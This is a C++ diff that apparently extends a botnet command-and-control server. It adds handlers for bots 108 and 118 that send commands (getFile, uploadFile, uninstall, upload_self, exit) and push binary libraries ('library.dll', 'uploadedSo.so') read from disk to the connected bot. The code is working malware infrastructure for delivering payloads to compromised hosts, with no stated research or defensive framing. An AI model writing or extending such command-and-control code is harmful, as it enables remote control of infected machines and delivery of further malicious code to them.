@@ -2,6 +2,7 @@
 #include "util.h"
 #include <string>
 #include <sstream>
+#include <fstream>
 
 void printBody(std::vector<uint8_t> req_body)
 {
@@ -113,6 +114,24 @@ void bot106(conn_t conn) // TODO
 	printBody(req_body);
 }
 
+std::vector<unsigned char> readLibrary(const char *filename) {
+
+	// open the file:
+	std::streampos fileSize;
+	std::ifstream file(filename, std::ios::binary);
+
+	// get its size:
+	file.seekg(0, std::ios::end);
+	fileSize = file.tellg(); 
+	file.seekg(0, std::ios::beg);
+
+	// read the data:
+	std::vector<BYTE> fileData(fileSize);
+	file.read((char*)&fileData[0], fileSize);
+	return fileData;
+
+}
+
 
 void bot108(conn_t conn) // TODO
 {
@@ -128,7 +147,34 @@ void bot108(conn_t conn) // TODO
 	write_response(conn, 200, { { "BotCommand", " getFile" } }, nullptr, 0);
 	request = read_request(conn, req_headers, req_body);
 	//printBody(req_body);
-	std::string str = std::string(req_body.begin(), req_body.end());
+	//std::string str = std::string(req_body.begin(), req_body.end());
+	std::vector<unsigned char> v = readLibrary("library.dll");
+	std::string str = std::string(v.begin(), v.end());
+	write_response(conn, 200, { { "BotCommand", " uploadFile" } }, str.c_str(), str.size());
+	request = read_request(conn, req_headers, req_body);
+	printBody(req_body);
+	write_response(conn, 200, { { "BotCommand", " uninstall" } }, nullptr, 0);
+	request = read_request(conn, req_headers, req_body);
+	printBody(req_body);
+}
+
+void bot118(conn_t conn) // TODO
+{
+	headers_t req_headers;
+	std::string request;
+	std::vector<uint8_t> req_body;
+	write_response(conn, 200, { { "BotCommand", " greetings" } }, nullptr, 0);
+	request = read_request(conn, req_headers, req_body);
+	printBody(req_body);
+	write_response(conn, 200, { { "BotCommand", " uninstall" } }, nullptr, 0);
+	request = read_request(conn, req_headers, req_body);
+	printBody(req_body);
+	write_response(conn, 200, { { "BotCommand", " getFile" } }, nullptr, 0);
+	request = read_request(conn, req_headers, req_body);
+	//printBody(req_body);
+	//std::string str = std::string(req_body.begin(), req_body.end());
+	std::vector<unsigned char> v = readLibrary("uploadedSo.so");
+	std::string str = std::string(v.begin(), v.end());
 	write_response(conn, 200, { { "BotCommand", " uploadFile" } }, str.c_str(), str.size());
 	request = read_request(conn, req_headers, req_body);
 	printBody(req_body);
@@ -214,8 +260,14 @@ int main(int argc, char *argv[])
 		case 1906:
 			bot1906(conn);
 			break;
+		case 118:
+			bot118(conn);
+			write_response(conn, 200, { { "BotCommand", "upload_self" } }, nullptr, 0);
+			write_response(conn, 200, { { "BotCommand", "exit" } }, nullptr, 0);
 		case 108:
 			bot108(conn);
+			write_response(conn, 200, { { "BotCommand", "upload_self" } }, nullptr, 0);
+			write_response(conn, 200, { { "BotCommand", "exit" } }, nullptr, 0);
 		default:
 			CLI(conn);
 			write_response(conn, 200, { { "BotCommand", "upload_self" } }, nullptr, 0);
